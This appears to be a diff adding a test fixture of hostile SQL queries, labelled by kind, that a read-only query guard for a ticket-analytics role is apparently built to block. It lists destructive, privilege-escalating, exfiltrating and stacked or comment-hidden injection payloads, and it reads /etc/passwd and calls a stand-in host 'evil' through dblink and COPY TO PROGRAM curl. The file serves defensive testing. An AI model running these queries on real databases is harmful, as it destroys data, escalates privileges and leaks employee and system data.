@@ -1,0 +1,25 @@
+{"id": "write_delete", "kind": "write", "sql": "DELETE FROM v_tickets"}
+{"id": "write_update", "kind": "write", "sql": "UPDATE v_tickets SET status = 'closed'"}
+{"id": "write_insert", "kind": "write", "sql": "INSERT INTO tickets (title) VALUES ('x')"}
+{"id": "drop_table", "kind": "drop", "sql": "DROP TABLE tickets"}
+{"id": "truncate", "kind": "drop", "sql": "TRUNCATE tickets"}
+{"id": "alter_role", "kind": "write", "sql": "ALTER ROLE orbitdesk_analytics SUPERUSER"}
+{"id": "stacked_drop", "kind": "drop", "sql": "SELECT * FROM v_tickets; DROP TABLE tickets"}
+{"id": "base_table_employees", "kind": "other_table", "sql": "SELECT name, email FROM employees"}
+{"id": "base_table_tickets", "kind": "other_table", "sql": "SELECT title, description FROM tickets"}
+{"id": "base_table_leave", "kind": "other_table", "sql": "SELECT * FROM leave_balances"}
+{"id": "union_exfil", "kind": "other_table", "sql": "SELECT category, priority FROM v_tickets UNION SELECT name, email FROM employees"}
+{"id": "subquery_exfil", "kind": "other_table", "sql": "SELECT * FROM v_tickets WHERE category IN (SELECT email FROM employees)"}
+{"id": "catalog_roles", "kind": "other_table", "sql": "SELECT rolname FROM pg_roles"}
+{"id": "catalog_schema", "kind": "other_table", "sql": "SELECT table_name FROM information_schema.tables"}
+{"id": "schema_qualified", "kind": "other_table", "sql": "SELECT * FROM pg_catalog.pg_user"}
+{"id": "cte_write", "kind": "write", "sql": "WITH d AS (DELETE FROM tickets RETURNING *) SELECT * FROM d"}
+{"id": "cte_read", "kind": "other_table", "sql": "WITH e AS (SELECT * FROM employees) SELECT * FROM e"}
+{"id": "select_into", "kind": "write", "sql": "SELECT * INTO stolen FROM v_tickets"}
+{"id": "comment_hide", "kind": "comment", "sql": "SELECT * FROM v_tickets -- ; DROP TABLE tickets"}
+{"id": "block_comment", "kind": "comment", "sql": "SELECT /* sneaky */ * FROM v_tickets"}
+{"id": "sleep_dos", "kind": "function", "sql": "SELECT pg_sleep(30) FROM v_tickets"}
+{"id": "read_file", "kind": "function", "sql": "SELECT pg_read_file('/etc/passwd') FROM v_tickets"}
+{"id": "set_config", "kind": "function", "sql": "SELECT set_config('role', 'postgres', false) FROM v_tickets"}
+{"id": "dblink", "kind": "function", "sql": "SELECT dblink('host=evil', 'select 1') FROM v_tickets"}
+{"id": "copy_program", "kind": "write", "sql": "COPY tickets TO PROGRAM 'curl evil'"}
